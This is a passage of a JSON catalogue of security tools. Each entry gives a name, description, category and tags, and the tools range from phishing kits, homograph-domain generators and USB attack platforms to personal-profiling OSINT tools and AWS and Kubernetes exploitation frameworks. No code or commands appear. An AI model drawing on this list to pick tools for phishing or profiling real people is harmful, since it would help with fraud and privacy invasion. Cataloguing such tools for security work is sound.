    "category": "Social Engineering",
    "tags": [
      "hardware",
      "keystroke injection",
      "payload delivery"
    ],
    "color": "#e59b4b"
  },
  {
    "name": "Bash Bunny",
    "description": "A multi-function USB attack and automation platform.",
    "category": "Social Engineering",
    "tags": [
      "hardware",
      "usb attack",
      "automation"
    ],
    "color": "#4b4be5"
  },
  {
    "name": "Catphish",
    "description": "A tool for creating phishing websites that are difficult to detect.",
    "category": "Social Engineering",
    "tags": [
      "phishing",
      "web",
      "evasion"
    ],
    "color": "#e54b75"
  },
  {
    "name": "EvilURL",
    "description": "Generate unicode evil domains for IDN Homograph Attack and detect them.",
    "category": "Social Engineering",
    "tags": [
      "phishing",
      "homograph attack",
      "url manipulation"
    ],
    "color": "#a0e54b"
  },
  {
    "name": "Sputnik",
    "description": "A tool to find email addresses and social media profiles of a person.",
    "category": "Social Engineering",
    "tags": [
      "osint",
      "email",
      "social media"
    ],
    "color": "#4be575"
  },
  {
    "name": "DaProfiler",
    "description": "A tool for finding social media accounts associated with an email or phone number.",
    "category": "Social Engineering",
    "tags": [
      "osint",
      "profiling",
      "social media"
    ],
    "color": "#e54bc3"
  },
  {
    "name": "Tinfoleak",
    "description": "A tool that automates the extraction of information on Twitter.",
    "category": "Social Engineering",
    "tags": [
      "osint",
      "twitter",
      "data extraction"
    ],
    "color": "#9be54b"
  },
  {
    "name": "Prowler",
    "description": "A command line tool for AWS security assessment, auditing, hardening and incident response.",
    "category": "Cloud Security",
    "tags": [
      "aws",
      "security audit",
      "cis benchmarks"
    ],
    "color": "#4b4be5"
  },
  {
    "name": "ScoutSuite",
    "description": "A multi-cloud security-auditing tool, which enables security posture assessment of cloud environments.",
    "category": "Cloud Security",
    "tags": [
      "multi-cloud",
      "audit",
      "aws",
      "gcp",
      "azure"
    ],
    "color": "#e54b75"
  },
  {
    "name": "Pacu",
    "description": "An open-source AWS exploitation framework.",
    "category": "Cloud Security",
    "tags": [
      "aws",
      "exploitation",
      "post-exploitation"
    ],
    "color": "#a0e54b"
  },
  {
    "name": "CloudSploit",
    "description": "An open-source project to detect security risks in cloud infrastructure accounts.",
    "category": "Cloud Security",
    "tags": [
      "aws",
      "azure",
      "gcp",
      "security scanner"
    ],
    "color": "#4be575"
  },
  {
    "name": "CloudMapper",
    "description": "Helps you analyze your Amazon Web Services (AWS) environments.",
    "category": "Cloud Security",
    "tags": [
      "aws",
      "network visualization",
      "audit"
    ],
    "color": "#e54bc3"
  },
  {
    "name": "PMapper",
    "description": "A tool for identifying risks in AWS IAM configurations.",
    "category": "Cloud Security",
    "tags": [
      "aws",
      "iam",
      "privilege escalation"
    ],
    "color": "#9be54b"
  },
  {
    "name": "Cartography",
    "description": "A Python tool that consolidates infrastructure assets and the relationships between them in an intuitive graph view.",
    "category": "Cloud Security",
    "tags": [
      "asset inventory",
      "graph database",
      "multi-cloud"
    ],
    "color": "#4ba0e5"
  },
  {
    "name": "Falco",
    "description": "A cloud native runtime security project, the de facto Kubernetes threat detection engine.",
    "category": "Cloud Security",
    "tags": [
      "kubernetes",
      "runtime security",
      "threat detection"
    ],
    "color": "#e54b4b"
  },
  {
    "name": "Trivy",
    "description": "A simple and comprehensive vulnerability scanner for containers and other artifacts.",
    "category": "Cloud Security",
    "tags": [
      "container security",
      "vulnerability scanner",
      "ci/cd"
    ],
    "color": "#56e54b"
  },
  {
    "name": "Kube-bench",
    "description": "Checks whether Kubernetes is deployed securely by running the checks documented in the CIS Kubernetes Benchmark.",
    "category": "Cloud Security",
    "tags": [
      "kubernetes",
      "cis benchmarks",
      "security audit"
    ],
    "color": "#4be5d0"
  },
  {
    "name": "Checkov",
    "description": "A static code analysis tool for infrastructure-as-code.",
    "category": "Cloud Security",
    "tags": [
      "iac",
      "terraform",
      "cloudformation",
      "static analysis"
    ],
    "color": "#a04be5"
  },
  {
    "name": "Terrascan",
    "description": "A static code analyzer for Infrastructure as Code to detect security vulnerabilities and compliance violations.",
    "category": "Cloud Security",
    "tags": [
      "iac",
      "security scanner",
      "compliance"
    ],
    "color": "#e5c34b"
  },
  {
    "name": "Cloud Custodian",
    "description": "A rules engine for managing public cloud accounts and resources.",
    "category": "Cloud Security",
    "tags": [
      "cloud governance",
      "automation",
      "compliance"
    ],
    "color": "#4b75e5"
  },
  {
    "name": "Steampipe",
    "description": "Use SQL to instantly query your cloud APIs.",
    "category": "Cloud Security",
    "tags": [
      "cloud query",
      "sql",
      "api",
      "audit"
    ],
    "color": "#e54ba0"
  },
  {
    "name": "WeirdAAL",
    "description": "AWS Attack Library for generating IAM policies that allow certain AWS attacks.",
    "category": "Cloud Security",
    "tags": [
      "aws",
      "iam",
      "attack simulation"
    ],
    "color": "#75e54b"
  },
  {
    "name": "CloudGoat",
    "description": "A \"Vulnerable by Design\" AWS deployment tool.",
    "category": "Cloud Security",
    "tags": [
      "aws",
      "vulnerable environment",
      "training"
    ],
    "color": "#4be5a0"
  },
  {
    "name": "ElectricEye",
    "description": "Continuously monitors AWS services for configurations that can lead to degradation of security.",
    "category": "Cloud Security",
    "tags": [
      "aws",
      "security audit",
      "monitoring"
    ],
    "color": "#c34be5"
  },
  {
    "name": "CloudQuery",
    "description": "An open-source cloud asset inventory powered by SQL.",
    "category": "Cloud Security",
    "tags": [
      "asset inventory",
      "sql",
      "multi-cloud"
    ],
    "color": "#e59b4b"
  },
  {
    "name": "Kube-hunter",
    "description": "Hunts for security weaknesses in Kubernetes clusters.",
    "category": "Cloud Security",
    "tags": [
      "kubernetes",
      "pentesting",
      "vulnerability scanner"
    ],
    "color": "#4b4be5"
  },
  {
    "name": "Peirates",
    "description": "A Kubernetes penetration tool.",
    "category": "Cloud Security",
    "tags": [
      "kubernetes",
      "pentesting",
      "post-exploitation"
    ],
    "color": "#e54b75"
  }
]